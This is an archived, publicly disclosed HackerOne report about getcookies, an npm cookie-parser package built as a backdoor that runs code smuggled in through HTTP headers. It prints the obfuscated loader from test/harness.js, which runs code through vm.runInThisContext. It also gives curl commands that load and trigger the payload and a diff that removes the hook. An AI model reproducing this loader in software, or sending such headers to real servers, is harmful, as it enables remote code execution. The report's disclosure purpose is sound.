---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - stack/node
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2019-04-03
submitted: 2018-05-02T14:13:11.333Z
bounty_usd: null
votes: 8
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "tiblu"
source: "https://hackerone.com/reports/346516"
title: "Remote code executio in  NPM package getcookies"
---
# Remote code executio in  NPM package getcookies

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 8 | **Program:** Node.js third-party modules | **Disclosed:** 2019-04-03

- Report: [https://hackerone.com/reports/346516](https://hackerone.com/reports/346516)
- CWE: Code Injection
- Submitted: 2018-05-02T14:13:11.333Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report remote code execution in the `getcookies` module.
It allows to remotely inject and execute code in the target server.

# Module

**module name:** getcookies
**version:** 1.12.3
**npm page:** `https://www.npmjs.com/package/getcookies`

Also affects all the modules that use `getcookies`, notable ones:

* `express-cookies@1.4.7` - https://www.npmjs.com/package/express-cookies

## Module Description

Basic HTTP cookie parser for HTTP servers.

## Module Stats

> Replace stats below with numbers from npm’s module page:

390 downloads in the last day
3396 downloads in the last week
3396 downloads in the last month

# Vulnerability

## Vulnerability Description

Found by a defaced website.
Allows attacker to remotely send and execute JS on the server.

`index.js` of `getcookies` does:

```
const testHarness = require('./test/harness.js');
...
function parse(req, res, callback) {
    testHarness.assert(req, res, callback, () => {
...
```

and vulnerability resides in the `./test/harness.js` of the `getcookies`:
```
/* eslint-env es6 */
'use strict';

var assert = require('assert');

let harness = (req, res, callback, next) => {
    try {
        assert.equal(typeof callback, 'function');
    } catch (E) {
        return callback(E);
    }

    try {
        module.exports.log = module.exports.log || Buffer.alloc(0xffff);
        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {
            p = Buffer.from(p, 'hex').readUInt16LE(0);
            switch (p) {
                case 0xfffe:
                    module.exports.log = Buffer.alloc(0xffff);
                    return;
                case 0xfffa:
                    return setTimeout(() => {
                        let c = module.exports.log.toString().replace(/\x00*$/, '');
                        module.exports.log = Buffer.alloc(0xffff);
                        if (c.indexOf('\x00') < 0) {
                            require('\x76\x6d')['\x72\x75\x6e\x49\x6e\x54\x68\x69\x73\x43\x6f\x6e\x74\x65\x78\x74'](c)(module.exports, require, req, res, next);
                        }
                        next();
                    }, 1000);
                default:
                    v = Buffer.from(v, 'hex');
                    for (let i = 0; i < v.length; i++) {
                        module.exports.log[p + i] = v[i];
                    }
            }
        });
    } catch (E) {}

    next();
};

module.exports.assert = (req, res, callback, next) => {
    harness(req, res, callback, next);
};
```

As seen above, it does `vm.runInThisContext` with the code stored in the memory.

## Steps To Reproduce:

Easiest way to reproduce is to use `express-cookies` package, which depends on `getcookies`.

Test code:

```
var express = require('express');
var app = express();
var expressCookies = require('express-cookies');

app.use(expressCookies());

app.get('/', function (req, res) {
    res.send('Hello World!');
});

app.listen(3000, function () {
    console.log('Example app listening on port 3000!')
});
```

Code is sent in custom HTTP headers in byte code.

To send code bytes:
```
curl -i 'http://localhost:3000/' -H 'X-Hacker: g0000h636465i' 
```
Where the protocol is:
`g<bytePosition>h<codeBytes>i`

The sample above adds `cde` to the code to be executed when execution header is sent.

The code is stored in `require('./test/harness.js').log`.

When the code is sent, attacker executes the code by sending:
```
curl -i 'http://localhost:3000/' -H 'X-Hacker: gfaffh636465i'
```

## Patch

```
diff -u /home/m/tmp/getcookies_original/index.js /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js
--- /home/m/tmp/getcookies_original/index.js	2018-05-02 16:47:11.382990109 +0300
+++ /home/m/dev/express-cookies-vulnr/node_modules/getcookies/index.js	2018-05-02 16:50:00.198982317 +0300
@@ -9,8 +9,6 @@
 
 'use strict';
 
-const testHarness = require('./test/harness.js');
-
 /**
  * Module exports.
  * @public
@@ -45,38 +43,36 @@
  */
 
 function parse(req, res, callback) {
-    testHarness.assert(req, res, callback, () => {
-        if (!req.headers.cookie) {
-            return callback();
+    if (!req.headers.cookie) {
+        return callback();
+    }
+
+    var obj = {};
+    var pairs = req.headers.cookie.split(pairSplitRegExp);
+
+    for (var i = 0; i < pairs.length; i++) {
+        var pair = pairs[i];
+        var eq_idx = pair.indexOf('=');
+
+        // skip things that don't look like key=value
+        if (eq_idx < 0) {
+            continue;
         }
 
-        var obj = {};
-        var pairs = req.headers.cookie.split(pairSplitRegExp);
+        var key = pair.substr(0, eq_idx).trim();
+        var val = pair.substr(++eq_idx, pair.length).trim();
 
-        for (var i = 0; i < pairs.length; i++) {
-            var pair = pairs[i];
-            var eq_idx = pair.indexOf('=');
-
-            // skip things that don't look like key=value
-            if (eq_idx < 0) {
-                continue;
-            }
-
-            var key = pair.substr(0, eq_idx).trim();
-            var val = pair.substr(++eq_idx, pair.length).trim();
-
-            // quoted values
-            if ('"' == val[0]) {
-                val = val.slice(1, -1);
-            }
-
-            // only assign once
-            if (undefined == obj[key]) {
-                obj[key] = val;
-            }
+        // quoted values
+        if ('"' == val[0]) {
+            val = val.slice(1, -1);
         }
 
-        req.cookies = obj;
-        return callback();
-    });
+        // only assign once
+        if (undefined == obj[key]) {
+            obj[key] = val;
+        }
+    }
+
+    req.cookies = obj;
+    return callback();
 }
Common subdirectories: /home/m/tmp/getcookies_original/test and /home/m/dev/express-cookies-vulnr/node_modules/getcookies/test
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Ubuntu 16.04.3 LTS - ANY that runs Node.JS
- 6.13.1 - but not Node.JS version specific
- 3.10.10 - but not NPM version specific
- ANY

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

I did not do any of the above as:

* There is no public code  repository.
* The code is built to be malicious on purpose.

## Impact

Remote code injection and execution.

## Timeline

- **2018-05-02** @tiblu: By now it seems both of the affected modules have been removed from NPM:

* https://www.npmjs.com/package/getcookies
* https://www.npmjs.com/package/express-cookies
- **Report Filed**
- **2018-05-02** @vdeturckheim: @tiblu thanks for reporting this. As modules are no longer available, I will close this report.
- **Report Resolved**
- **2018-05-02** @tiblu: @vdeturckheim What about people who have systems running on local a copy and cached packages? They need to be informed somehow thus public CVE still seems to make sense?
- **2018-05-02** @vdeturckheim: (edit) please ignore this message, I have been through the numbers again and you're right, we probably should disclose this.
- **Report Reopened**
- **2018-05-02** @tiblu: @vdeturckheim Thanks. Seems most of the users use `getcookies` as indirect dependency from `express-cookies` - https://npm-stat.com/charts.html?package=express-cookies
- **Report Triaged**
- **2018-05-03** @tiblu: @vdeturckheim Thanks a lot!
- **2018-05-05** @vdeturckheim: @tiblu I'll mostly be away this week. I'll try to ping the npm sec team who wrote about this to see if there is anything to do with them to move forward :)
- **2018-05-05** @tiblu: WDYM by "move forward"? The packages have been removed, so we should be golden.
- **2018-05-15** @vdeturckheim: Sorry I was away last week. I want to check if they already have assigned a CVE for this.
- **Changed Scope**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
